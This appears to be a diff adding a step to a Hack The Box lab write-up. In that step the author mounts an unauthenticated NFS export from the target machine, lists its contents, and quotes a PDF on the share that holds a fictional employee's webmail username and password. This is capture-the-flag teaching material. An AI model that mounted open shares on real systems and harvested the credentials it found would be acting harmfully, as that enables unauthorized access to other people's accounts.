@@ -59,5 +59,35 @@ Export list for 10.129.33.28:
 `*` wildcard = no authentication, anyone on the network can mount
 
 ```
+ajdev@rootbox:~/HTB/Enigma$ sudo mkdir -p /mnt/nfs
+[sudo] password for ajdev:
+ajdev@rootbox:~/HTB/Enigma$ sudo mount -t nfs 10.129.33.28:/srv/nfs/onboarding /mnt/nfs
+ajdev@rootbox:~/HTB/Enigma$ ls -la /mnt/nfs
+total 12
+drwxr-xr-x 2 root root 4096 Feb 20 01:39 .
+drwxr-xr-x 3 root root 4096 Jun 28 08:14 ..
+-rw-r--r-- 1 root root 1751 Feb 20 01:38 New_Employee_Access.pdf
+```
+
+In pdf found:
 
 ```
+Enigma Corp
+
+IT Department - New Employee System Access
+Employee:Kevin Mitchell
+Department:Operations
+Provisioned by:IT Department
+Date:2024-03-01
+
+Webmail Access
+URL:http://mail001.enigma.htb
+Username:kevin
+Password:Enigma2024!
+Please change your password upon first login.
+For support contact: it@enigma.htb
+This document contains confidential internal information intended solely for the recipient.
+Unauthorized access, disclosure, or distribution is strictly prohibited.
+Generated automatically by Enigma Corp Identity Management System.
+```
+
